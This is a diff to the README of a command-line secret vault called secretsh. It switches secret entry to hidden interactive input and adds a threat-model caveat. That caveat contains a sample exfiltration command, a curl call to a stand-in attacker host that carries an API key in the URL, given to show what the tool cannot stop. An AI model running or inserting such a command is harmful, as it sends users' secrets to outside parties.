@@ -83,11 +83,13 @@ secretsh init
 secretsh import-env -f .env
 ```
 
-**Or add secrets one at a time** (type the value, then press Ctrl+D on a new line to finish):
+**Or add secrets one at a time** (input is hidden, press Enter to submit):
 
 ```bash
 secretsh set API_PASS
+# Enter secret for API_PASS: ********
 secretsh set API_USER
+# Enter secret for API_USER: ********
 ```
 
 ### 3. Run commands with `{{placeholders}}`
@@ -113,7 +115,7 @@ Values are never displayed.
 | Command | Description |
 |---------|-------------|
 | `secretsh init` | Create a new encrypted vault |
-| `secretsh set <KEY>` | Store a secret (reads value from stdin) |
+| `secretsh set <KEY>` | Store a secret (interactive hidden input) |
 | `secretsh delete <KEY>` | Remove a secret |
 | `secretsh list` | List key names (never values) |
 | `secretsh run -- "cmd"` | Execute a command with secret injection + output redaction |
@@ -143,6 +145,8 @@ All commands read the passphrase from the `SECRETSH_KEY` environment variable by
 - Physical memory attacks (cold boot, kernel exploits)
 - Malicious commands that exfiltrate their own arguments
 - Compromise of the master passphrase itself
+
+**To be clear** -- this isn't a silver bullet. It doesn't stop a truly malicious command from exfiltrating data (e.g. `curl attacker.com/{{OUR_API_KEY}}`). But it does solve the massive problem of accidental exposure in logs, history, and LLM context windows.
 
 See [docs/threat-model.md](docs/threat-model.md) for the full threat model and technical architecture.
 
